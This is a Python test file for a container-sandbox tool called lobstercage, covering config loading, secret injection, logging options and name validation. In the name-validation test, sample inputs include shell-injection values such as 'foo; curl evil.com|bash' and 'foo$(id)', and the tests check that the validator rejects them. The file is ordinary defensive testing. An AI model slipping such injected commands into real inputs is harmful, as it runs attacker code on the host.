"""Tests for lobstercage config parsing and validation."""

import os
import textwrap

import pytest

from lobstercage.config import Config, ContainerConfig, LoggingConfig, load_config, validate_config


class TestLoadConfigMinimal:
    def test_name(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.name == "test"

    def test_image(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.container.image == "localhost/test:latest"

    def test_defaults(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        cc = cfg.container
        assert cc.user == "1000:1000"
        assert cc.read_only is True
        assert cc.drop_capabilities == ["ALL"]
        assert cc.add_capabilities == []
        assert cc.no_new_privileges is True
        assert cc.security_label_disable is True
        assert cc.restart == "on-failure"
        assert cc.restart_sec == 10
        assert cc.timeout_start_sec == 120
        assert cc.timeout_stop_sec == 30
        assert cc.memory == ""
        assert cc.cpus == ""
        assert cc.command == []
        assert cc.volumes == []
        assert cc.env == {}
        assert cc.named_volumes == {}
        assert cc.tmpfs == []
        assert cc.ports == []
        assert cc.podman_secrets == []

    def test_no_secret_injection(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.secret_injection == []

    def test_no_dns_servers(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.dns_servers == []


class TestLoadConfigFull:
    def test_all_fields(self, full_yaml):
        cfg = load_config(full_yaml)
        assert cfg.name == "myapp"
        cc = cfg.container
        assert cc.image == "node:22-slim"
        assert cc.command == ["node", "/app/agent.js"]
        assert cc.volumes == ["./agent:/app:ro"]
        assert cc.env == {"ANTHROPIC_API_KEY": "${ANTHROPIC_API_KEY}", "STATIC_VAR": "hello"}
        assert cc.named_volumes == {"myapp-data": "/data:rw"}
        assert cc.tmpfs == ["/tmp:rw,noexec,nosuid,size=64M"]
        assert cc.ports == ["127.0.0.1:8080:8080"]
        assert cc.user == ""
        assert cc.memory == "4g"
        assert cc.cpus == "2.0"
        assert cc.read_only is False
        assert cc.drop_capabilities == []
        assert cc.add_capabilities == ["NET_BIND_SERVICE"]
        assert cc.no_new_privileges is False
        assert cc.security_label_disable is False
        assert cc.restart == "no"
        assert cc.restart_sec == 0
        assert cc.timeout_start_sec == 300
        assert cc.timeout_stop_sec == 60

    def test_secret_injection(self, full_yaml):
        cfg = load_config(full_yaml)
        assert len(cfg.secret_injection) == 1
        rule = cfg.secret_injection[0]
        assert rule.env == "INJECTED_KEY"
        assert rule.placeholder == "{{INJECTED_KEY}}"
        assert rule.inject_to == ["api.example.com"]

    def test_injected_secret_removed_from_podman_secrets(self, full_yaml):
        cfg = load_config(full_yaml)
        assert "INJECTED_KEY" not in cfg.container.podman_secrets
        assert "MY_API_KEY" in cfg.container.podman_secrets

    def test_dns_servers(self, full_yaml):
        cfg = load_config(full_yaml)
        assert cfg.dns_servers == ["100.100.100.100", "1.1.1.1"]


class TestLoadConfigSecretInjectionFormats:
    def test_list_format(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secret_injection:
              - env: KEY1
                placeholder: "{{KEY1}}"
        """))
        cfg = load_config(str(p))
        assert len(cfg.secret_injection) == 1
        assert cfg.secret_injection[0].env == "KEY1"

    def test_dict_with_rules_format(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secret_injection:
              rules:
                - env: KEY1
                  placeholder: "{{KEY1}}"
                - env: KEY2
                  placeholder: "{{KEY2}}"
                  inject_to:
                    - example.com
        """))
        cfg = load_config(str(p))
        assert len(cfg.secret_injection) == 2
        assert cfg.secret_injection[1].inject_to == ["example.com"]


class TestLoadConfigOpenclaw:
    def test_openclaw_config(self, openclaw_yaml):
        cfg = load_config(openclaw_yaml)
        assert cfg.name == "openclaw"
        assert cfg.container.image == "ghcr.io/openclaw/openclaw:latest"
        assert len(cfg.container.command) == 8
        assert cfg.container.memory == "4g"
        assert cfg.container.cpus == "2.0"
        assert len(cfg.secret_injection) == 1
        assert cfg.secret_injection[0].env == "ANTHROPIC_API_KEY"
        # ANTHROPIC_API_KEY is in secret_injection, not podman_secrets
        assert "ANTHROPIC_API_KEY" not in cfg.container.podman_secrets

    def test_openclaw_podman_secrets_preserved(self, openclaw_yaml):
        cfg = load_config(openclaw_yaml)
        assert "OPENCLAW_GATEWAY_TOKEN" in cfg.container.podman_secrets
        assert "OPENCLAW_GATEWAY_PASSWORD" in cfg.container.podman_secrets


class TestLoggingConfig:
    def test_defaults_all_false(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.logging.dns_queries is False
        assert cfg.logging.proxy_connections is False
        assert cfg.logging.allowed_requests is False

    def test_explicit_true(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              dns_queries: true
              proxy_connections: true
              allowed_requests: true
        """))
        cfg = load_config(str(p))
        assert cfg.logging.dns_queries is True
        assert cfg.logging.proxy_connections is True
        assert cfg.logging.allowed_requests is True

    def test_legacy_log_allowed_compat(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            log_allowed: true
        """))
        cfg = load_config(str(p))
        assert cfg.logging.allowed_requests is True

    def test_new_key_overrides_legacy(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            log_allowed: true
            logging:
              allowed_requests: false
        """))
        cfg = load_config(str(p))
        assert cfg.logging.allowed_requests is False


class TestLoadConfigEdgeCases:
    def test_empty_file(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("")
        cfg = load_config(str(p))
        assert cfg.name == ""

    def test_drop_capabilities_string(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              drop_capabilities: NET_RAW
        """))
        cfg = load_config(str(p))
        assert cfg.container.drop_capabilities == ["NET_RAW"]


class TestValidateConfig:
    def test_valid_config(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        warnings = validate_config(cfg)
        assert warnings == []

    def test_missing_name(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("container:\n  image: test:latest\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="name"):
            validate_config(cfg)

    @pytest.mark.parametrize("bad_name", [
        "foo; curl evil.com|bash",
        "foo$(id)",
        "foo`id`",
        "Uppercase",
        "-starts-with-dash",
        "has spaces",
        "has_underscores",
        "a" * 64,  # too long
    ])
    def test_rejects_invalid_name(self, tmp_path, bad_name):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: '{bad_name}'\ncontainer:\n  image: x\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="name"):
            validate_config(cfg)

    @pytest.mark.parametrize("good_name", [
        "myapp",
        "my-app",
        "a",
        "test123",
        "a" * 63,
    ])
    def test_accepts_valid_name(self, tmp_path, good_name):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: '{good_name}'\ncontainer:\n  image: x\n")
        cfg = load_config(str(p))
        validate_config(cfg)  # should not raise

    def test_missing_image(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("name: test\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="image"):
            validate_config(cfg)

    def test_warns_unset_env_var(self, tmp_path, monkeypatch):
        monkeypatch.delenv("NONEXISTENT_VAR_12345", raising=False)
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              env:
                MY_KEY: "${NONEXISTENT_VAR_12345}"
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any("NONEXISTENT_VAR_12345" in w for w in warnings)

    def test_no_warn_for_set_env_var(self, tmp_path, monkeypatch):
        monkeypatch.setenv("EXISTING_VAR_TEST", "value")
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              env:
                MY_KEY: "${EXISTING_VAR_TEST}"
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert warnings == []
